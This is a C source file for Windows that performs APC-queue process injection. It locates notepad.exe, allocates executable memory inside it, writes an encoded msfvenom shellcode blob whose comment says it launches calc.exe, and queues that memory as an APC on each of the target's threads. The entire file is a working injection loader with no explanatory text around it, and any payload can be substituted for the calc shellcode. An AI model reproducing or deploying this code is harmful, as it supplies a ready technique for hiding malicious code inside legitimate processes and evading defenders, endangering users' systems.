#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

#define TARGET_PROCESS_NAME "notepad.exe"

DWORD find_process(char* process_name) {

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	for (Process32First(snapshot, &pe);Process32Next(snapshot, &pe);) {
		if (strcmp(pe.szExeFile, process_name) == 0) {
			CloseHandle(snapshot);
			return pe.th32ProcessID;
		}
	}

	CloseHandle(snapshot);
	return 0;
}

///msfvenom -p windows/x64/exec cmd=calc.exe -b '\x00\x0a\x0d' -f c
unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xb3\xa0\xa5\x9d\x05\x60\x36\x3e\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4f\xe8\x26\x79\xf5\x88"
"\xf6\x3e\xb3\xa0\xe4\xcc\x44\x30\x64\x6f\xe5\xe8\x94\x4f\x60"
"\x28\xbd\x6c\xd3\xe8\x2e\xcf\x1d\x28\xbd\x6c\x93\xe8\x2e\xef"
"\x55\x28\x39\x89\xf9\xea\xe8\xac\xcc\x28\x07\xfe\x1f\x9c\xc4"
"\xe1\x07\x4c\x16\x7f\x72\x69\xa8\xdc\x04\xa1\xd4\xd3\xe1\xe1"
"\xf4\xd5\x8e\x32\x16\xb5\xf1\x9c\xed\x9c\xd5\xeb\xb6\xb6\xb3"
"\xa0\xa5\xd5\x80\xa0\x42\x59\xfb\xa1\x75\xcd\x8e\x28\x2e\x7a"
"\x38\xe0\x85\xd4\x04\xb0\xd5\x68\xfb\x5f\x6c\xdc\x8e\x54\xbe"
"\x76\xb2\x76\xe8\xac\xcc\x28\x07\xfe\x1f\xe1\x64\x54\x08\x21"
"\x37\xff\x8b\x40\xd0\x6c\x49\x63\x7a\x1a\xbb\xe5\x9c\x4c\x70"
"\xb8\x6e\x7a\x38\xe0\x81\xd4\x04\xb0\x50\x7f\x38\xac\xed\xd9"
"\x8e\x20\x2a\x77\xb2\x70\xe4\x16\x01\xe8\x7e\x3f\x63\xe1\xfd"
"\xdc\x5d\x3e\x6f\x64\xf2\xf8\xe4\xc4\x44\x3a\x7e\xbd\x5f\x80"
"\xe4\xcf\xfa\x80\x6e\x7f\xea\xfa\xed\x16\x17\x89\x61\xc1\x4c"
"\x5f\xf8\xd5\xbf\x61\x36\x3e\xb3\xa0\xa5\x9d\x05\x28\xbb\xb3"
"\xb2\xa1\xa5\x9d\x44\xda\x07\xb5\xdc\x27\x5a\x48\xbe\x90\x83"
"\x9c\xe5\xe1\x1f\x3b\x90\xdd\xab\xc1\x66\xe8\x26\x59\x2d\x5c"
"\x30\x42\xb9\x20\x5e\x7d\x70\x65\x8d\x79\xa0\xd2\xca\xf7\x05"
"\x39\x77\xb7\x69\x5f\x70\xfe\x64\x0c\x55\x10\xd6\xd8\xc0\x9d"
"\x05\x60\x36\x3e";

int main() {

	
	DWORD target_process_id = find_process(TARGET_PROCESS_NAME);
	HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_process_id);
	LPVOID target_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(target_process_handle, target_process_buffer, shellcode, sizeof(shellcode), NULL);
	printf("target process id is %d\n", target_process_id);

	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
		if (te.th32OwnerProcessID == target_process_id) {
			
			HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);
			
			if (QueueUserAPC((PAPCFUNC)target_process_buffer ,target_thread_handle, NULL)) {
				printf("adding to APC queue of thread id %d\n", te.th32ThreadID);
			}
			
		}
	}


	CloseHandle(snapshot);


	
	CloseHandle(target_process_handle);

	return 0;
}
